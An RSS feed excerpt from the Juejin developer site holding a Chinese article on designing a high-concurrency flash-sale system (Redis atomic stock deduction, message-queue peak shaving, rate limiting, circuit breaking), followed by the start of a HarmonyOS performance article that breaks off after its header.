<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[设计一个支持万人同时抢购商品的秒杀系统?]]></title>    <link>https://juejin.cn/post/7594642978695266367</link>    <guid>https://juejin.cn/post/7594642978695266367</guid>    <pubDate>2026-01-13T08:03:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594642978695266367" data-draft-id="7594642978695249983" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="设计一个支持万人同时抢购商品的秒杀系统?"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-13T08:03:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小假"/> <meta itemprop="url" content="https://juejin.cn/user/2285197690931932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            设计一个支持万人同时抢购商品的秒杀系统?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2285197690931932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小假
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T08:03:47.000Z" title="Tue Jan 13 2026 08:03:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、系统架构设计</h2>
<h3 data-id="heading-1">1. 分层架构</h3>
<pre><code class="hljs language-markdown" lang="markdown">客户端层 → 接入层 → 业务服务层 →  数据层
<span class="hljs-code">     ↓       ↓         ↓          ↓
    限流    缓存       队列      数据库
</span></code></pre>
<h3 data-id="heading-2">2. 具体组件</h3>
<ul>
<li><strong>客户端</strong>：静态资源CDN、倒计时校准、防重复提交</li>
<li><strong>接入层</strong>：Nginx+Lua/OpenResty，做第一层限流和缓存</li>
<li><strong>业务层</strong>：</li>
</ul>

<ul>
<li>
<ul>
<li>秒杀服务集群（无状态）</li>
<li>消息队列（Kafka/RocketMQ）</li>
<li>缓存集群（Redis Cluster）</li>
</ul>
</li>
</ul>

<ul>
<li><strong>数据层</strong>：</li>
</ul>

<ul>
<li>
<ul>
<li>主从数据库（读写分离）</li>
<li>分库分表（按商品/时间）</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">二、核心问题解决方案</h2>
<h3 data-id="heading-4">1. 超卖问题</h3>
<h4 data-id="heading-5">解决方案一：Redis原子操作</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用Redis的DECR原子操作扣减库存</span>
def deduct_stock(product_id, user_id):
    <span class="hljs-attr">stock_key</span> = f<span class="hljs-string">"stock:{product_id}"</span>

<span class="hljs-comment"># Lua脚本保证原子性</span>
<span class="hljs-attr">lua_script</span> = <span class="hljs-string">"""
local stock = tonumber(redis.call('GET', KEYS[1]))
if stock and stock &gt; 0 then
redis.call('DECR', KEYS[1])
return 1
end
return 0
"""</span>

<span class="hljs-attr">result</span> = redis.eval(lua_script, <span class="hljs-number">1</span>, stock_key)
return <span class="hljs-attr">result</span> == <span class="hljs-number">1</span>
</code></pre>
<h4 data-id="heading-6">解决方案二：数据库乐观锁</h4>
<pre><code class="hljs language-ini" lang="ini">UPDATE products 
SET <span class="hljs-attr">stock</span> = stock - <span class="hljs-number">1</span>, version = version + <span class="hljs-number">1</span> 
WHERE <span class="hljs-attr">id</span> = ? AND stock &gt; <span class="hljs-number">0</span> AND version = ?
</code></pre>
<h4 data-id="heading-7">解决方案三：预扣库存</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 先预扣Redis库存，再异步同步到DB</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title">preDeductStock</span><span class="hljs-params">(<span class="hljs-type">String</span> productId, <span class="hljs-type">int</span> count)</span> </span>{
    <span class="hljs-type">String</span> key = <span class="hljs-string">"seckill:stock:"</span> + productId;
    Long remaining = redisTemplate.<span class="hljs-built_in">opsForValue</span>().<span class="hljs-built_in">decrement</span>(key, count);

    <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 发送MQ消息异步扣减数据库</span>
        <span class="hljs-built_in">sendStockDeductMessage</span>(productId, count);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 库存不足，回滚</span>
        redisTemplate.<span class="hljs-built_in">opsForValue</span>().<span class="hljs-built_in">increment</span>(key, count);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h3 data-id="heading-8">2. 高并发请求处理</h3>
<h4 data-id="heading-9">2.1 流量削峰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 使用消息队列缓冲请求</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SeckillService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RocketMQTemplate mqTemplate;

    <span class="hljs-keyword">public</span> SeckillResult seckill(SeckillRequest request) {
        <span class="hljs-comment">// 1. 校验用户和商品状态</span>
        <span class="hljs-keyword">if</span> (!validate(request)) {
            <span class="hljs-keyword">return</span> SeckillResult.fail(<span class="hljs-string">"校验失败"</span>);
        }

        <span class="hljs-comment">// 2. 生成唯一请求ID</span>
        String requestId = generateRequestId(request);

        <span class="hljs-comment">// 3. 请求入队，立即返回</span>
        mqTemplate.sendOneWay(<span class="hljs-string">"seckill-topic"</span>, 
                              MessageBuilder.withPayload(request).build());

        <span class="hljs-comment">// 4. 返回排队中状态，前端轮询结果</span>
        <span class="hljs-keyword">return</span> SeckillResult.processing(requestId);
    }
}
</code></pre>
<h4 data-id="heading-10">2.2 分层过滤</h4>
<pre><code class="hljs">所有请求 → 合法性校验 → 库存校验 → 频率控制 → 实际下单
   ↓           ↓          ↓         ↓         ↓
 100万        50万       10万       5万       1万
</code></pre>
<h3 data-id="heading-11">3. 系统性能优化</h3>
<h4 data-id="heading-12">3.1 缓存策略</h4>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># 多级缓存配置</span>
<span class="hljs-section">缓存层级:</span>
  一级: JVM本地缓存 (Caffeine) - 热点商品
  二级: Redis集群 - 库存信息
  三级: 数据库 - 最终一致性
</code></pre>
<h4 data-id="heading-13">3.2 读多写少优化</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 商品信息缓存预热</span>
<span class="hljs-keyword">@Service</span>
public class CacheWarmUpService {

    <span class="hljs-keyword">@PostConstruct</span>
    public void warmUpSeckillProducts() {
        List&lt;Product&gt; hotProducts = <span class="hljs-built_in">loadHotProducts</span>();

        for (Product product : hotProducts) {
            <span class="hljs-comment">// 库存信息</span>
            redisTemplate<span class="hljs-selector-class">.opsForValue</span>()<span class="hljs-selector-class">.set</span>(
                "stock:" + product.getId(),
                product<span class="hljs-selector-class">.getStock</span>()
            );

            <span class="hljs-comment">// 商品详情</span>
            redisTemplate<span class="hljs-selector-class">.opsForValue</span>()<span class="hljs-selector-class">.set</span>(
                "product:" + product.getId(),
                JSON<span class="hljs-selector-class">.toJSONString</span>(product)
            );

            <span class="hljs-comment">// 使用布隆过滤器存储可售商品ID</span>
            bloomFilter<span class="hljs-selector-class">.add</span>(product.getId());
        }
    }
}
</code></pre>
<h3 data-id="heading-14">4. 详细实现方案</h3>
<h4 data-id="heading-15">4.1 秒杀流程</h4>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SeckillSystem</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_seckill</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, user_id, product_id</span>):
        <span class="hljs-comment"># 1. 恶意请求拦截</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.check_risk(user_id):
            <span class="hljs-keyword">return</span> {<span class="hljs-string">"code"</span>: <span class="hljs-number">403</span>, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"访问过于频繁"</span>}

        <span class="hljs-comment"># 2. 布隆过滤器快速判断</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bloom_filter.contains(product_id):
            <span class="hljs-keyword">return</span> {<span class="hljs-string">"code"</span>: <span class="hljs-number">404</span>, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"商品不存在"</span>}

        <span class="hljs-comment"># 3. 内存标记（已售罄的商品直接返回）</span>
        <span class="hljs-keyword">if</span> sold_out_flags.get(product_id):
            <span class="hljs-keyword">return</span> {<span class="hljs-string">"code"</span>: <span class="hljs-number">400</span>, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"已售罄"</span>}

        <span class="hljs-comment"># 4. Redis原子扣减库存</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.deduct_stock_in_redis(product_id):
            sold_out_flags[product_id] = <span class="hljs-title class_">True</span>
            <span class="hljs-keyword">return</span> {<span class="hljs-string">"code"</span>: <span class="hljs-number">400</span>, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"库存不足"</span>}

        <span class="hljs-comment"># 5. 生成订单ID（雪花算法）</span>
        order_id = snowflake.generate()

        <span class="hljs-comment"># 6. 订单信息入队</span>
        mq.send({
            <span class="hljs-string">"order_id"</span>: order_id,
            <span class="hljs-string">"user_id"</span>: user_id,
            <span class="hljs-string">"product_id"</span>: product_id,
            <span class="hljs-string">"time"</span>: time.time()
        })

        <span class="hljs-comment"># 7. 返回排队中</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"msg"</span>: <span class="hljs-string">"排队中"</span>,
            <span class="hljs-string">"order_id"</span>: order_id,
            <span class="hljs-string">"queue_position"</span>: get_queue_position(order_id)
        }
</code></pre>
<h4 data-id="heading-16">4.2 库存同步方案</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Component</span>
<span class="hljs-keyword">@Slf</span>4j
public class StockSyncService {

    <span class="hljs-comment">// 数据库最终扣减</span>
    <span class="hljs-keyword">@Transactional</span>
    public void syncStockToDB(String productId, int count) {
        try {
            <span class="hljs-comment">// 数据库扣减（带重试机制）</span>
            boolean success = productDAO<span class="hljs-selector-class">.deductStock</span>(productId, count);

            if (success) {
                <span class="hljs-comment">// 更新Redis中的最终库存状态</span>
                redisTemplate<span class="hljs-selector-class">.opsForValue</span>()<span class="hljs-selector-class">.set</span>(
                    "stock_final:" + productId,
                    getDBStock(productId)
                );

                <span class="hljs-comment">// 删除售罄标记</span>
                soldOutCache<span class="hljs-selector-class">.remove</span>(productId);
            }
        } catch (Exception e) {
            log<span class="hljs-selector-class">.error</span>("库存同步失败", e);
            <span class="hljs-comment">// 记录异常，人工介入处理</span>
            alertService<span class="hljs-selector-class">.sendAlert</span>(e);
        }
    }

    <span class="hljs-comment">// 库存对账任务</span>
    <span class="hljs-keyword">@Scheduled</span>(cron = <span class="hljs-string">"0 */5 * * * ?"</span>)
    public void stockReconciliation() {
        List&lt;Product&gt; products = productDAO<span class="hljs-selector-class">.getAllSeckillProducts</span>();

        for (Product product : products) {
            Integer redisStock = <span class="hljs-built_in">getRedisStock</span>(product.getId());
            Integer dbStock = product<span class="hljs-selector-class">.getStock</span>();

            if (!Objects.equals(redisStock, dbStock)) {
                log<span class="hljs-selector-class">.warn</span>("库存不一致: productId={}, redis={}, db={}", 
                         product.getId(), redisStock, dbStock);
                <span class="hljs-comment">// 自动修复或报警</span>
                <span class="hljs-built_in">fixStockInconsistency</span>(product.getId(), dbStock);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-17">三、高可用保障</h2>
<h3 data-id="heading-18">1. 限流降级策略</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># 多维度限流配置</span>
<span class="hljs-section">限流规则:</span>
  用户维度: 每个用户10次/分钟
  IP维度: 每个IP 1000次/分钟
  商品维度: 每个商品 10000次/分钟
  总QPS: 系统最大承受50000 QPS
</code></pre>
<h3 data-id="heading-19">2. 熔断降级</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@Slf4j</span>
public class SeckillController {

    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/seckill/{productId}"</span>)
    <span class="hljs-variable">@HystrixCommand</span>(
        fallbackMethod = <span class="hljs-string">"seckillFallback"</span>,
        commandProperties = {
            <span class="hljs-variable">@HystrixProperty</span>(name = <span class="hljs-string">"execution.isolation.thread.timeoutInMilliseconds"</span>, value = <span class="hljs-string">"1000"</span>),
            <span class="hljs-variable">@HystrixProperty</span>(name = <span class="hljs-string">"circuitBreaker.requestVolumeThreshold"</span>, value = <span class="hljs-string">"20"</span>)
        }
    )
    public Response <span class="hljs-built_in">seckill</span>(<span class="hljs-variable">@PathVariable</span> String productId, 
                            <span class="hljs-variable">@RequestParam</span> String userId) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">seckillService</span><span class="hljs-selector-class">.process</span>(userId, productId);
    }

    <span class="hljs-comment">// 降级方法</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Response</span> <span class="hljs-selector-tag">seckillFallback</span>(String productId, String userId) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">Response</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"系统繁忙，请稍后重试"</span>);
    }
}
</code></pre>
<h2 data-id="heading-20">四、监控与告警</h2>
<h3 data-id="heading-21">1. 关键监控指标</h3>
<ul>
<li><strong>系统层面</strong>：QPS、RT、错误率、CPU/内存使用率</li>
<li><strong>应用层面</strong>：库存扣减成功率、消息堆积量</li>
<li><strong>业务层面</strong>：抢购成功率、用户排队时长</li>
</ul>
<h3 data-id="heading-22">2. 监控实现</h3>
<pre><code class="hljs language-arduino" lang="arduino">@Component
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SeckillMonitor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MeterRegistry meterRegistry;

    <span class="hljs-comment">// 记录关键指标</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">recordSeckill</span><span class="hljs-params">(<span class="hljs-type">String</span> productId, <span class="hljs-type">boolean</span> success, <span class="hljs-type">long</span> cost)</span> </span>{
        <span class="hljs-comment">// QPS监控</span>
        meterRegistry.<span class="hljs-built_in">counter</span>(<span class="hljs-string">"seckill.requests.total"</span>).<span class="hljs-built_in">increment</span>();

        <span class="hljs-keyword">if</span> (success) {
            meterRegistry.<span class="hljs-built_in">counter</span>(<span class="hljs-string">"seckill.success.total"</span>).<span class="hljs-built_in">increment</span>();
        } <span class="hljs-keyword">else</span> {
            meterRegistry.<span class="hljs-built_in">counter</span>(<span class="hljs-string">"seckill.fail.total"</span>).<span class="hljs-built_in">increment</span>();
        }

        <span class="hljs-comment">// 耗时分布</span>
        meterRegistry.<span class="hljs-built_in">timer</span>(<span class="hljs-string">"seckill.process.time"</span>)
        .<span class="hljs-built_in">record</span>(cost, TimeUnit.MILLISECONDS);

        <span class="hljs-comment">// 库存变化</span>
        meterRegistry.<span class="hljs-built_in">gauge</span>(<span class="hljs-string">"seckill.stock."</span> + productId, 
                            <span class="hljs-built_in">getCurrentStock</span>(productId));
    }
}
</code></pre>
<h2 data-id="heading-23">五、部署与扩展</h2>
<h3 data-id="heading-24">1. 弹性扩展策略</h3>
<ul>
<li><strong>水平扩展</strong>：无状态服务可快速扩容</li>
<li><strong>自动伸缩</strong>：基于CPU使用率或QPS自动扩缩容</li>
<li><strong>异地多活</strong>：重要业务支持多机房部署</li>
</ul>
<h3 data-id="heading-25">2. 压测方案</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">压测场景:</span>
  场景1: 库存预热，10万用户同时抢1万商品
  场景2: 持续高压，5万QPS持续5分钟
  场景3: 峰值冲击，瞬间20万QPS
  
<span class="hljs-section">压测目标:</span>
  成功率: &gt;99.9%
  平均RT: &lt;100ms
  错误率: &lt;0.1%
</code></pre>
<h2 data-id="heading-26">六、安全考虑</h2>
<ol>
<li><strong>防刷机制</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li>验证码（峰值时降级）</li>
<li>设备指纹</li>
<li>行为分析</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>数据安全</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li>关键数据加密</li>
<li>操作日志记录</li>
<li>防篡改校验</li>
</ul>
</li>
</ul>
<h2 data-id="heading-27">总结要点</h2>
<ol>
<li><strong>架构核心</strong>：分层过滤 + 异步处理 + 最终一致</li>
<li><strong>库存核心</strong>：Redis原子操作 + 消息队列 + 数据库乐观锁</li>
<li><strong>性能核心</strong>：缓存预热 + 流量削峰 + 读写分离</li>
<li><strong>稳定核心</strong>：熔断降级 + 限流隔离 + 快速失败</li>
</ol>
<h2 data-id="heading-28">面试回答</h2>
<p>首先，<strong>架构设计上要动静分离、分层削峰</strong>。我会把系统分为：</p>
<ol>
<li><strong>静态资源分离</strong>：商品图片、描述页等提前推送到CDN，请求直接走边缘节点，不给后端压力。</li>
<li><strong>网关层限流</strong>：在入口用Nginx或网关（如Sentinel）做恶意请求拦截和总流量限制，比如对同一UID限速，超过阈值直接返回“请求频繁”。</li>
<li><strong>业务逻辑后置，请求队列化</strong>：秒杀的核心——“下单扣库存”这个最重要的逻辑，绝不放在前台实时处理。用户点击“抢购”后，前端直接返回“排队中”，请求进入一个<strong>消息队列</strong>（比如RabbitMQ、Kafka或RocketMQ）。这样一来，海量并发就被平滑成顺序处理的流量，后端服务按照自己的能力从队列里慢慢消费，实现<strong>削峰填谷</strong>。</li>
<li><strong>服务独立部署</strong>：把秒杀相关的功能（验资格、扣库存）单独做成一个微服务，避免影响商城其他正常功能（如浏览、普通下单）。</li>
</ol>
<p>其次，针对如何解决超卖、库存扣减和高并发请求这三个核心问题，我的解决方案是：</p>
<ol>
<li><strong>解决超卖和库存扣减</strong>：这是秒杀的核心。我的方案是：</li>
</ol>
<ul>
<li>
<ul>
<li><strong>预扣库存</strong>：活动开始前，把商品的库存从主库加载到<strong>Redis</strong>中。Redis是单线程内存操作，可以保证原子性。</li>
<li><strong>原子化操作</strong>：在Redis里，使用 <code>DECR</code> 或 <code>LUA</code> 脚本来扣减库存。<code>DECR</code> 命令会直接返回扣减后的值，如果返回值小于0，就说明库存没了，后续流程直接返回售罄。LUA脚本可以打包多个操作（检查库存、扣减），确保整个过程原子性，彻底杜绝超卖。</li>
<li><strong>最终同步</strong>：后台服务从队列消费，成功扣减Redis库存后，生成一个订单ID（但状态是“未支付”），再异步去更新数据库的库存。这里数据库的库存更多是用于后续对账和长尾查询。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>应对高并发请求</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li><strong>限流</strong>：除了网关层的总限流，在秒杀服务本身也要做限流，比如用信号量或令牌桶控制处理线程数，只服务自己能承受的流量，多的直接拒绝，快速失败。</li>
<li><strong>无状态化与扩容</strong>：秒杀服务做成无状态的，方便用K8s或云服务快速横向扩容，扛过峰值后再缩容，控制成本。</li>
<li><strong>热点数据隔离</strong>：对于“爆款”商品，它的库存Key在Redis里是热点Key。可以做两件事：一是提前对它进行<strong>Key散列</strong>，把压力分散到多个Redis节点；二是使用Redis集群模式，并开启读写分离。</li>
</ul>
</li>
</ul>
<p>最后，还有一些<strong>关键的细节和兜底策略</strong>：</p>
<ul>
<li><strong>防刷与验证</strong>：前端加入计算型验证码或答题，防止机器人；下单前必须校验用户资格（是否登录、地址完善等）。</li>
<li><strong>异步下单与结果轮询</strong>：用户提交后，服务端返回一个“排队ID”，前端用这个ID轮询后端，查询最终结果（成功、失败或等待）。用户体验上是“排队等待”，而不是一直卡住或报错。</li>
<li><strong>数据一致性对账</strong>：因为用了Redis和消息队列，可能出现极端情况下的数据不一致（比如Redis扣成功，但下游服务挂了，订单没生成）。需要有一个定时对账任务，核对Redis、数据库库存和订单状态，进行修复。</li>
<li><strong>降级与熔断</strong>：如果Redis或数据库访问慢，要有熔断机制，防止服务被拖垮。比如可以快速降级到“返回售罄”的静态页面。</li>
</ul>
<hr/>
<p><strong>总结一下</strong>，我的设计思路是：<strong>前端限流拦截，请求队列削峰；Redis原子扣减防超卖；服务无状态化应对高并发；再通过异步、对账等手段保证最终一致性和用户体验</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[鸿蒙 APP 还是卡顿？API 21 性能优化这 3 招，立竿见影！]]></title>    <link>https://juejin.cn/post/7594863660297617450</link>    <guid>https://juejin.cn/post/7594863660297617450</guid>    <pubDate>2026-01-14T09:10:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594863660297617450" data-draft-id="7594791357143973930" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="鸿蒙 APP 还是卡顿？API 21 性能优化这 3 招，立竿见影！"/> <meta itemprop="keywords" content="HarmonyOS,ArkTS,ArkUI"/> <meta itemprop="datePublished" content="2026-01-14T09:10:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="威哥爱编程"/> <meta itemprop="url" content="https://juejin.cn/user/2242659450109575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            鸿蒙 APP 还是卡顿？API 21 性能优化这 3 招，立竿见影！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659450109575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    威哥爱编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:10:07.000Z" title="Wed Jan 14 2026 09:10:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
